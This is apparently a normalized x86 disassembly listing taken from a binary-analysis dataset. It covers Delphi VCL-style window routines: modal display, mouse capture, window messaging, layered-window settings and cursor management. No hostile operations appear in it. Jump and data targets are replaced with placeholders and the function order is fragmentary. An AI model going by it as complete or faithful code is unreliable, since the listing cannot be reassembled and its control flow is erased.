mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46bfb0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46bf34
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46bfa2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bfa9
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_46a78c
sub_46bfcc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46c294
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_44e0b4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_46e46c
xor edx edx
push ebp
push sub_46c277
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_418a2c
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_46d49c
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_466388
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_46c255
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_46bf1c
xor edx edx
push ebp
push sub_46c1b4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46be7c
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46f278
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_456054
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c1bb
mov eax [ ebp - 0x4 ]
call sub_46bf14
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_46c1bb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c25f
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46d49c
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_46d49c
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4189a8
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_418b4c
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_46643c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_46c2a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_452d84
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46c2a4
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_452d48
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_46c314
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_46c2a4
pop ecx
mov eax [ esi + 0x34 ]
call sub_4617a0
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_4617b0
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_46c398
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4543a4
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_4034ac
sub_46c3bc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_4034ac
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46c3ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_452d84
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46c3bc
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46c3ec
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_452d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c468
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46c3bc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46c3bc
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46c3ec
pop ecx
test al al
je r-xdata
sub_46c4bc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_4034ac
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46c4ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_452d84
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46c4bc
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46c4ec
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_452d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c568
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46c4bc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46c4bc
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46c4ec
pop ecx
test al al
je r-xdata
sub_46c5bc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_4189b0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_45bd3c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46c610
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_46c5bc
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_4034ac
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c68c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_421b00
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_46c6c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_44fd38
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_450a20
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46c710
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_456054
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_456054
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_456054
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_456054
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_456054
push eax
call RedrawWindow
sub_46c864
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_467614
mov dl 0x5
mov eax ebx
call sub_469388
mov dl 0x1
mov eax ebx
call sub_454c30
mov dl 0x3
mov eax ebx
call sub_469684
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_46c8cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46c9a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_454af0
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_45495c
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_44ed68
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7c8
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_40419c
mov eax [ ebp - 0xc ]
call sub_40436c
push eax
mov eax [ ebp - 0xc ]
call sub_40456c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_44f7d8
mov eax [ ebp - 0xc ]
call sub_40436c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c9aa
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
mov dl 0x1
mov eax esi
call sub_468a08
mov edx [ ebp - 0xc ]
mov eax esi
call sub_44f884
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4046f8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46c9d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_452d84
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_46812c
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_452d48
mov edx ebx
pop ecx
mov si 0xffcc
call sub_4034ac
inc ebp
dec edi
jne r-xdata
sub_46ca1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_454af0
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46ca48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4552f8
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_46ca70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_46add8
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_456054
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_454af0
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_456054
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_456054
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_454b04
or ecx 0xffffffff
mov dl 0x1
call sub_44ff14
pop esi
pop ebx
retn
sub_46cb08
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_455768
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_450a20
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_44f1f4
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_4034ac
sub_46cb60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46cc26
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44f7c8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40419c
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
call sub_40456c
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_44f7d8
mov eax [ ebp - 0x4 ]
call sub_40436c
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44f884
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cc2d
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_468a08
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4046f8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46cc4c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4554e8
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_454af0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_454b04
mov dl [ ebx + 0x57 ]
call sub_44f774
inc edi
dec esi
jne r-xdata
sub_46ccf0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_46cd20
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_46cd50
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421370
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46d0f4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46d100
mov eax ebx
call sub_46d10c
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_469528
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424220
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424220
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424220
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_46d52c
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46d408
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46d408
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46d408
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_46cea8
push ebx
push esi
push edi
push ebp
call sub_403664
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_4032b0
mov eax [ ebp + 0x88 ]
call sub_4032b0
mov eax [ ebp + 0x84 ]
call sub_4032b0
mov eax [ ebp + 0x54 ]
call sub_4032b0
mov eax [ ebp + 0x50 ]
call sub_4032b0
mov eax [ ebp + 0x4c ]
call sub_4032b0
mov eax [ ebp + 0x30 ]
call sub_4032b0
mov eax [ ebp + 0x34 ]
call sub_4032b0
mov eax [ ebp + 0x7c ]
call sub_4032b0
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_4032b0
mov eax ebp
call sub_46d168
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4213bc
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40364c
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4189b0
call sub_4032b0
inc edi
dec esi
jne r-xdata
sub_46d020
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_46d06c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418854
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418854
mov eax [ rw-data ]
call sub_46fdf8
sub_46d0a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418b4c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418b4c
mov eax [ rw-data ]
call sub_46fdf8
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_45762c
sub_46d10c
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_46d1c4
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_46d168
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_40270c
mov ebx esi
test ebx ebx
jne r-xdata
sub_46d1c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026ec
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_46d1ec
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46d397
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d39e
lea eax [ ebp - 0x260 ]
call sub_4040ac
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
